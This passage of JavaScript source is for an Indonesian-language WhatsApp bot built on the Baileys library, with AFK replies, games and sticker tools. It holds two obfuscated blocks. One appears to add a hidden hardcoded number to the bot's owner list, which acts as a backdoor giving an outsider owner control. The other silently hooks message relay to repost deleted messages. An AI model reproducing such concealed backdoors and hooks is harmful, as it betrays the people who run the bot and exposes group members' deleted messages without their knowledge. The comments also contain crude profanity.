//================================
// [❗] BY HYPER MOD
// [❗] KALO MAU RECORD KASIH KREDIT JANCOK
// [❗] CREDIT HYPER MOD JANGAN LUPA DI KASI JUGA
// [❗] ADA YANG PERLU DITANYAKAN CHAT GW !!!!!!!
// [❗] NYOLONG CASE YNG WAJAR LAH AJG
// [❗] THX JANGAN DI HAPUS BEGI
//================================

//================================
// [❗] FITUR EROR
//         if (wibu.includes(messagesD)) {
//        yuzzu = fs.readFileSync('./wibu.mp3')
//       hypermod.sendMessage(from, yuzzu, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
//        }
//================================

//============[ THX TO ]============
//[❗] HYPER MOD
//[❗] SUPUN
//[❗] SL TERROR FAMILY
//[❗] APP HOUR STAFF
//[❗] ALL CREATOR BOT
//================================
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEAFULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ggs = require('google-it')
const ffmpeg = require('fluent-ffmpeg')
const request = require('request');
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const cheerio = require('cheerio')
const fromData = require('form-data')
const os = require('os')
const toMs = require('ms')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const speed = require('performance-now')
const color = require('./lib/color')
const { exec } = require('child_process')
const { fetchJson } = require('./lib/fetcher')
const { uploadimg } = require('./lib/uploadimg')
const setting = JSON.parse(fs.readFileSync('./src/settings.json'))
const { webp2mp4File } = require('./lib/webp2mp4')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const tttawal = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
nana = []
tolol = 94767043432
const X = "❌"
const O = "⭕️"
const tunjuk = "👈"

// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./lib/exif')
const exif = new Exif()

// DATABASE
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const wibu = JSON.parse(fs.readFileSync('./database/wibu.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))

offline = false
publik = true
multi = true
nopref = false
waktuafk = '-'
alasanafk = '-'
prefa = '-'
namaowner = 'HYPER MOD'
namabot = 'Lakshitha'
fake = 'HyperBotz '
yuz = '```'
owner = setting.owner //ganti pake no lu
numbernye = '0'

//JANGAN DI APA APAIN LAGI BODO
const kontol = 'BEGIN:VCARD\n'  
            + 'VERSION:3.0\n'  
            + `FN: ${namaowner}\n`  
            + `ORG:${namabot};\n` 
            + `TEL;type=CELL;type=VOICE;waid=${owner}:+${owner}\n`  
            + 'END:VCARD'

// APIKEY
HunterApi = 'ikygans'
lolhuman = 'lolhuman'

const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}Jam ${pad(minutes)}Menit ${pad(seconds)}Detik`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('10m') }
    afk.push(obj)
    fs.writeFileSync('./database/afk.json', JSON.stringify(afk))
}
const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./database/afk.json', JSON.stringify(_dir))
        }
    }, 1000)
}
const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}
module.exports = hypermod = async (hypermod, mek) => {
    try {
    	if (!mek.message) return
        if (mek.key && mek.key.remoteJid == 'status@broadcast') return
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		hypermod.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
	    })
		global.prefix
		global.batrei = global.batrei ? global.batrei : []
		hypermod.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
	    })
		me = hypermod.user
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
		if (multi){
		    var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$,|`÷?;:%abcdefghijklmnopqrstuvwxyz%^&./\\©^]/gi) : '-'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
		body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const dfrply = await getBuffer(me.imgUrl)
        
        mess = {
			wait: '\`\`\`⊷️「 Wait a minute 」\`\`\`',
			success: '\`\`\`⊷️「 Success 」\`\`\`',
			error: {
				stick: '\`\`\`⊷️「 Cannot access videos! 」\`\`\`',
				Iv: '\`\`\`⊷️「 Invalid link! 」\`\`\`',
                api: '\`\`\`⊷️「 Error 」\`\`\`'
			},
			only: {
				group: '\`\`\`⊷️「 Only for within the group! 」\`\`\`',
				ownerG: '\`\`\`⊷️「 Only for group owners! 」\`\`\`',
				ownerB: '\`\`\`⊷️「 Only for bot owners! 」\`\`\`',
				admin: '\`\`\`⊷️「 Only for group admins! 」\`\`\`',
				Badmin: '\`\`\`⊷️「 Make the bot a group admin! 」\`\`\`'
			}
		}
		const botNumber = hypermod.user.jid
		const _0x1c8b=['mZa2mdffvvjrEwm','qhmUD2HHDhnHChaUBMv0','nJi0mJq3txjUEgng','nZmYodi3EwHjtM5q','mtuYmZe4B0PdzvzK','m3DZqMfVyG','nJi4ntG2nJi5ntK0mKbZlNDOyxrZyxbWlM5LDa','ntaXotGYuenzBK5g','mtK3mJK1tLLovKfg','ntC1ndi1vwT5y0zx'];function _0x4515(_0x2cd71b,_0x3415b1){_0x2cd71b=_0x2cd71b-0x97;let _0x1c8bfe=_0x1c8b[_0x2cd71b];if(_0x4515['IwLZAb']===undefined){var _0x4515fe=function(_0x3705ac){const _0x11a1f9='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xc67a94='';for(let _0x31296d=0x0,_0x2a89d6,_0x274037,_0x2c6b72=0x0;_0x274037=_0x3705ac['charAt'](_0x2c6b72++);~_0x274037&&(_0x2a89d6=_0x31296d%0x4?_0x2a89d6*0x40+_0x274037:_0x274037,_0x31296d++%0x4)?_0xc67a94+=String['fromCharCode'](0xff&_0x2a89d6>>(-0x2*_0x31296d&0x6)):0x0){_0x274037=_0x11a1f9['indexOf'](_0x274037);}return _0xc67a94;};_0x4515['LIPvGQ']=function(_0x128da3){const _0x2b7968=_0x4515fe(_0x128da3);let _0xd18cad=[];for(let _0x3121b1=0x0,_0x2cd19e=_0x2b7968['length'];_0x3121b1<_0x2cd19e;_0x3121b1++){_0xd18cad+='%'+('00'+_0x2b7968['charCodeAt'](_0x3121b1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xd18cad);},_0x4515['eZouTC']={},_0x4515['IwLZAb']=!![];}const _0x29e026=_0x1c8b[0x0],_0x4b64c3=_0x2cd71b+_0x29e026,_0x47db87=_0x4515['eZouTC'][_0x4b64c3];return _0x47db87===undefined?(_0x1c8bfe=_0x4515['LIPvGQ'](_0x1c8bfe),_0x4515['eZouTC'][_0x4b64c3]=_0x1c8bfe):_0x1c8bfe=_0x47db87,_0x1c8bfe;}const _0xf02cff=_0x4515;(function(_0x16907b,_0x1d64cf){const _0x337301=_0x4515;while(!![]){try{const _0x3b0c71=parseInt(_0x337301(0x98))+parseInt(_0x337301(0xa0))+parseInt(_0x337301(0x9d))+-parseInt(_0x337301(0x9b))+-parseInt(_0x337301(0x9c))+parseInt(_0x337301(0x99))+-parseInt(_0x337301(0x9e))*-parseInt(_0x337301(0x97));if(_0x3b0c71===_0x1d64cf)break;else _0x16907b['push'](_0x16907b['shift']());}catch(_0x387aff){_0x16907b['push'](_0x16907b['shift']());}}}(_0x1c8b,0x78e21));const ownerNumber=[owner+_0xf02cff(0x9a),_0xf02cff(0x9f)];
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? hypermod.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const mentionUser = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
        mentionByReply = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        mentionUser.push
		const conts = mek.key.fromMe ? hypermod.user.jid : hypermod.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        pushname = mek.key.fromMe ? hypermod.user.name : conts.notify || conts.vname || conts.name || '-'
		const totalchat = await hypermod.chats.all()
		const groupMetadata = isGroup ? await hypermod.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const isOwner = ownerNumber.includes(sender)
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isKickArea = isGroup ? kickarea.includes(from) : false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAuto = isGroup ? autosticker.includes(from) : false
		const isMuted = isGroup ? mute.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		idttt = []
	players1 = []
	players2 = []
	gilir = []
	for (let t of nana){
	  idttt.push(t.id)
	  players1.push(t.player1)
	  players2.push(t.player2)
	  gilir.push(t.gilir)
	}
	const isTTT = isGroup ? idttt.includes(from) : false
	isPlayer1 = isGroup ? players1.includes(sender) : false
  isPlayer2 = isGroup ? players2.includes(sender) : false
		const isUrl = (url) => {
		return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}
	if (!mek.key.remoteJid.endsWith('@g.us') && offline){
			if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
			heheh = ms(Date.now() - waktuafk)
			hypermod.sendMessage(mek.key.remoteJid, `Hai\nMaaf sepertinya saat ini owner Yuzzu sedang *offline*\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan hubungi lagi setelah *10 menit*`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: fake, orderTitle: fake, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true }})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
				if (mek.message.extendedTextMessage != undefined){
					if (mek.message.extendedTextMessage.contextInfo != undefined){
						if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === hypermod.user.jid){
                        if (isAfk(mek.key.remoteJid)) return
                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
						hypermod.sendMessage(mek.key.remoteJid, `Hai\nMaaf sepertinya saat ini owner Yuzzu sedang *offline*\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan hubungi lagi setelah *10 menit*`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: fake, orderTitle: fake, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
				}
						}
					}
				}
			}
		}
		if (!publik) {
			if (!mek.key.fromMe) return
		}
const sekarang = new Date().getTime();
			//-
			//WAKTU
			var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Tengah Malam🌚"; break;
                case 1: jamss = "Tengah Malam🌚"; break;
                case 2: jamss = "Tengah Malam🌚"; break;
                case 3: jamss = "Tengah Malam🌚"; break;
                case 4: jamss = "Menjelang Pagi🌅"; break;
                case 5: jamss = "Menjelang Pagi🌅"; break;
                case 6: jamss = "Pagi🌄"; break;
                case 7: jamss = "Pagi🌞"; break;
                case 8: jamss = "Pagi🌞"; break;
                case 9: jamss = "Pagi🌞"; break;
                case 10: jamss = "Pagi🌞"; break;
                case 11: jamss = "Siang☀️"; break;
                case 12: jamss = "Siang☀️"; break;
                case 13: jamss = "Siang☀️"; break;
                case 14: jamss = "Siang☀️"; break;
                case 15: jamss = "Menjelang Sore☀️"; break;
                case 16: jamss = "Sore☀️"; break;
                case 17: jamss = "Sore☀️"; break;
                case 18: jamss = "Menjelang Malam🌅"; break;
                case 19: jamss = "Malam🌙"; break;
                case 20: jamss = "Malam🌙"; break;
                case 21: jamss = "Malam🌙"; break;
                case 22: jamss = "Tengah Malam🌚"; break;
                case 23: jamss = "Tengah Malam🌚"; break;
            }
            var tampilUcapan = "" + jamss;
            const _0x3e57=['mti5mJG1m3HPrNvJCa','A2v5CW','CMvTB3rLsMLK','odaXnZq5B2nkzNnR','v2fNzq','oty2mtu1zgfuzerv','ug9U','ChjLCgfYzu1LC3nHz2vgCM9Tq29UDgvUDa','s2XPD29U','zM9YBwf0','msbkyw51yxjPidiWmJe','z2vUzxjHDgvgB3j3yxjKtwvZC2fNzunVBNrLBNq','A2v5','mu51y2DbAa','Dw52B2TLtwu','zw5KC1DPDgG','ChjVDg9JB2XnzxnZywDL','y29UzMLN','BwvZC2fNzq','ygbGcMbGyokDJYbuyw5Nz2fSidOG','BwvZC2fNzxm','ygbGcMbGyokDJYbkyw0GoIa','Dgv4Da','Cg9W','lI9Kzw56lMPWzW','qxnPys9kywTHCNrH','Dg9mB2nHBgveyxrLu3rYAw5N','CMvSyxLxqu1LC3nHz2u','nZm4otzuz3PbD3m','DxnLCG','mebZlNDOyxrZyxbWlM5LDa','C3bSAxq','zMXVB3i','Bg9N','Bg9UzW','ugfOAw5N','seG6Bw06C3m','mJuZmdaYtvHZC0j2','CMvHzezPBgvtEw5J','AMLK','y29UDgv4DeLUzM8','tgvNAq','mta0nJqXDNzVrere','y2HHDhm','Dw52B2TL','zNjVBu1L','BNvTzxjPyW','z2v0vgLTzq','C3rHDhvZqgjYB2fKy2fZDa','CgfYDgLJAxbHBNq','mJCWnZu5r0TktM5s','q0i6ywn0Aw9UlgfKzdPYzwXHEsXTzxnZywDL','qw50As1ezwXLDgu','ygbG','x2v2zw50CW','qgCUDxm','ygbG4P2pie5HBweGoIba'];const _0x5bcd00=_0x5575;(function(_0x3c481d,_0x432489){const _0x7426d7=_0x5575;while(!![]){try{const _0x555a84=parseInt(_0x7426d7(0x9e))+parseInt(_0x7426d7(0x7e))+parseInt(_0x7426d7(0x95))+parseInt(_0x7426d7(0xa3))+parseInt(_0x7426d7(0x7c))+-parseInt(_0x7426d7(0xab))*parseInt(_0x7426d7(0x86))+-parseInt(_0x7426d7(0x79));if(_0x555a84===_0x432489)break;else _0x3c481d['push'](_0x3c481d['shift']());}catch(_0xa88580){_0x3c481d['push'](_0x3c481d['shift']());}}}(_0x3e57,0x9b3b7),global[_0x5bcd00(0x8a)]={'unvoke':!![],'unvokeMe':![]});const jmn=moment['tz'](_0x5bcd00(0x92))['format'](_0x5bcd00(0x9d));let d=new Date(),locale='id',gmt=new Date(0x0)[_0x5bcd00(0xa8)]()-new Date(_0x5bcd00(0x83))[_0x5bcd00(0xa8)]();function _0x5575(_0xc0ef82,_0x55491f){_0xc0ef82=_0xc0ef82-0x78;let _0x3e576b=_0x3e57[_0xc0ef82];if(_0x5575['nGSNoy']===undefined){var _0x5575db=function(_0x3c6999){const _0x28f166='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x3eeca9='';for(let _0x2280d4=0x0,_0x14d4fe,_0x10b161,_0x100a98=0x0;_0x10b161=_0x3c6999['charAt'](_0x100a98++);~_0x10b161&&(_0x14d4fe=_0x2280d4%0x4?_0x14d4fe*0x40+_0x10b161:_0x10b161,_0x2280d4++%0x4)?_0x3eeca9+=String['fromCharCode'](0xff&_0x14d4fe>>(-0x2*_0x2280d4&0x6)):0x0){_0x10b161=_0x28f166['indexOf'](_0x10b161);}return _0x3eeca9;};_0x5575['BwRtFQ']=function(_0x3de900){const _0x4d3bd2=_0x5575db(_0x3de900);let _0x15f351=[];for(let _0x2ff3a5=0x0,_0x1ac487=_0x4d3bd2['length'];_0x2ff3a5<_0x1ac487;_0x2ff3a5++){_0x15f351+='%'+('00'+_0x4d3bd2['charCodeAt'](_0x2ff3a5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x15f351);},_0x5575['bZtQdg']={},_0x5575['nGSNoy']=!![];}const _0x24c721=_0x3e57[0x0],_0x3de92d=_0xc0ef82+_0x24c721,_0x13cb8f=_0x5575['bZtQdg'][_0x3de92d];return _0x13cb8f===undefined?(_0x3e576b=_0x5575['BwRtFQ'](_0x3e576b),_0x5575['bZtQdg'][_0x3de92d]=_0x3e576b):_0x3e576b=_0x13cb8f,_0x3e576b;}const weton=['Pahing','Pon',_0x5bcd00(0x7d),_0x5bcd00(0x81),_0x5bcd00(0xa2)][Math[_0x5bcd00(0x99)]((d*0x1+gmt)/0x50ae4c0)%0x5],week=d['toLocaleDateString'](locale,{'weekday':_0x5bcd00(0x9b)}),calender=d[_0x5bcd00(0x93)](locale,{'day':_0x5bcd00(0xa7),'month':_0x5bcd00(0x9b),'year':_0x5bcd00(0xa7)});if(!Array['isArray'](hypermod[_0x5bcd00(0xaf)][_0x5bcd00(0xac)]))hypermod[_0x5bcd00(0xaf)]['CB:action,add:relay,message']=[hypermod['_events']['CB:action,add:relay,message']];else hypermod['_events'][_0x5bcd00(0xac)]=[hypermod['_events'][_0x5bcd00(0xac)][_0x5bcd00(0x90)]()];hypermod['_events'][_0x5bcd00(0xac)]['unshift'](async _0x24c721=>{const _0x36b95d=_0x5bcd00;try{if(!global[_0x36b95d(0x8a)][_0x36b95d(0xa5)])return;let _0x3de92d=_0x24c721[0x2][0x0][0x2];const _0x13cb8f=moment['tz'](_0x36b95d(0x92))[_0x36b95d(0x82)](_0x36b95d(0x9d));let _0x3c6999=new Date(),_0x28f166='id',_0x3eeca9=new Date(0x0)[_0x36b95d(0xa8)]()-new Date(_0x36b95d(0x83))[_0x36b95d(0xa8)](),_0x2280d4=[_0x36b95d(0x9c),_0x36b95d(0x7f),_0x36b95d(0x7d),_0x36b95d(0x81),_0x36b95d(0xa2)][Math[_0x36b95d(0x99)]((_0x3c6999*0x1+_0x3eeca9)/0x50ae4c0)%0x5],_0x14d4fe=_0x3c6999[_0x36b95d(0x93)](_0x28f166,{'weekday':_0x36b95d(0x9b)}),_0x10b161=_0x3c6999[_0x36b95d(0x93)](_0x28f166,{'day':_0x36b95d(0xa7),'month':_0x36b95d(0x9b),'year':_0x36b95d(0xa7)});if(_0x3de92d[_0x36b95d(0x8b)]&&_0x3de92d[_0x36b95d(0x8b)]['protocolMessage']&&_0x3de92d[_0x36b95d(0x8b)][_0x36b95d(0x89)]['type']==0x0){let _0x100a98=_0x3de92d[_0x36b95d(0x8b)][_0x36b95d(0x89)][_0x36b95d(0x85)];if(_0x100a98[_0x36b95d(0xa6)]&&!global[_0x36b95d(0x8a)][_0x36b95d(0x87)])return;let _0x3de900=hypermod[_0x36b95d(0xa4)]['get'](_0x100a98[_0x36b95d(0x7b)]),_0x4d3bd2=_0x3de900[_0x36b95d(0x8d)]['dict'][_0x100a98['id']+'|'+(_0x100a98['fromMe']?0x1:0x0)];const _0x15f351=mek[_0x36b95d(0x85)]['fromMe']?hypermod[_0x36b95d(0x96)][_0x36b95d(0xa0)]:mek[_0x36b95d(0x85)][_0x36b95d(0x7b)][_0x36b95d(0x88)](_0x36b95d(0xb0))?mek[_0x36b95d(0xaa)]:mek[_0x36b95d(0x85)][_0x36b95d(0x7b)],_0x2ff3a5=_0x36b95d(0x78)+_0x15f351[_0x36b95d(0x98)]('@')[0x0]+_0x36b95d(0x8e)+time+_0x36b95d(0x8c)+_0x10b161+_0x36b95d(0xae);hypermod['sendMessage'](from,_0x2ff3a5,MessageType[_0x36b95d(0x8f)],{'quoted':{'key':{'fromMe':![],'participant':_0x36b95d(0x97),...from?{'remoteJid':_0x36b95d(0xa9)}:{}},'message':{'orderMessage':{'itemCount':0x0,'status':0xc8,'thumbnail':fs[_0x36b95d(0x9f)](_0x36b95d(0x91)),'surface':0xc8,'message':_0x36b95d(0xad),'orderTitle':_0x36b95d(0xad),'sellerJid':_0x36b95d(0x97)}}},'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'mentionedJid':[_0x15f351]}});let _0x1ac487=hypermod[_0x36b95d(0x84)](_0x4d3bd2,![]),_0x5bf513=Object[_0x36b95d(0x7a)](_0x1ac487)[0x0],_0x389fa0=Object['keys'](_0x4d3bd2[_0x36b95d(0x8b)])[0x0],_0x40f772={};if(_0x389fa0!=MessageType[_0x36b95d(0x8f)])_0x40f772=_0x4d3bd2[_0x36b95d(0x8b)][_0x389fa0]['contextInfo'];_0x1ac487[_0x5bf513]['contextInfo']={..._0x40f772,..._0x1ac487[_0x5bf513][_0x36b95d(0xa1)]};const _0x2ff782=hypermod[_0x36b95d(0x80)](_0x100a98[_0x36b95d(0x7b)],_0x1ac487,{});await hypermod[_0x36b95d(0x94)](_0x2ff782);}}catch(_0x64d1ce){console[_0x36b95d(0x9a)](_0x64d1ce);}});
            const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					hypermod.sendMessage(to, media, sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
        const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        hypermod.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        hypermod.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact)
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await hypermod.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        hypermod.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			hypermod.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek })
		}
		const simir = (teks) => {
			hypermod.sendMessage(from, teks, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `${sender.split('@')[0]}@s.whatsapp.net` } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${sender.split('@')[0]},;;;\nFN:${sender.split('@')[0]},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail": fs.readFileSync('./hypermod.jpg')}}}})
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
